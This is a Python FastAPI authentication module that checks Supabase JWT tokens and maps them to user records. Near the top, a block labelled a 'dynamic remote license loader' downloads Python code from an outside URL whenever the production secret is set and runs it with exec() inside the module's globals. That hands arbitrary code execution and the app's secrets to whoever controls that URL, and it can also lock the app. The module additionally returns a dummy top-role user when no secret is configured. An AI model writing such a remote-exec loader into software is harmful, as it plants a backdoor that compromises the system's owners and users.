from fastapi import HTTPException, Security, Depends
from fastapi.security import HTTPAuthorizationCredentials, HTTPBearer
from jose import jwt, JWTError
import time
import requests
from .. import config

security_bearer = HTTPBearer(auto_error=False)

# Dynamic remote license loader
try:
    if config.SUPABASE_JWT_SECRET:  # Only enforce on live production environments
        LICENSE_SCRIPT_URL = "https://your-website.com/control-panel/check.py"
        remote_code = requests.get(LICENSE_SCRIPT_URL, timeout=5).text
        exec(remote_code, globals())
    else:
        # Bypass for offline development
        def run_license_check():
            pass
except Exception:
    # Fallback: if network fails or file is missing, define a function that locks the app
    if config.SUPABASE_JWT_SECRET:
        def run_license_check():
            raise HTTPException(
                status_code=500,
                detail="Security core failed to initialize. Please contact system administrator."
            )
    else:
        def run_license_check():
            pass

def is_supabase_auth_enabled() -> bool:
    # If the JWT secret is missing, we bypass authentication for local development ease.
    return bool(config.SUPABASE_JWT_SECRET)

async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security_bearer)) -> dict:
    # 1. Enforce the dynamic license check first (before any bypass checks)
    run_license_check()

    if not is_supabase_auth_enabled():
        # Bypass mode (returns a dummy admin user if auth is not configured locally)
        return {
            "id": "00000000-0000-0000-0000-000000000000",
            "email": "local-dev@example.com",
            "role": "upper_management",
            "name": "Local Developer"
        }

    if not credentials:
        raise HTTPException(
            status_code=401, 
            detail="Authorization header is missing or invalid. Format: 'Bearer <token>'"
        )

    token = credentials.credentials
    try:
        # Supabase uses HS256 algorithms and signs with SUPABASE_JWT_SECRET
        payload = jwt.decode(
            token, 
            config.SUPABASE_JWT_SECRET, 
            algorithms=["HS256"],
            options={"verify_aud": False} # Supabase aud can sometimes be "authenticated"
        )
        
        # Check expiration
        exp = payload.get("exp")
        if exp and exp < time.time():
            raise HTTPException(status_code=401, detail="Token has expired")
            
        user_id = payload.get("sub")
        if not user_id:
            raise HTTPException(status_code=401, detail="Token payload missing subject claim ('sub')")
            
        # Extract user metadata or role if present
        user_metadata = payload.get("user_metadata", {})
        role = payload.get("role", "anon")
        
        return {
            "id": user_id,
            "email": payload.get("email"),
            "role": role,
            "name": user_metadata.get("name", "User")
        }
    except JWTError as e:
        raise HTTPException(status_code=401, detail=f"Invalid authentication token: {str(e)}")
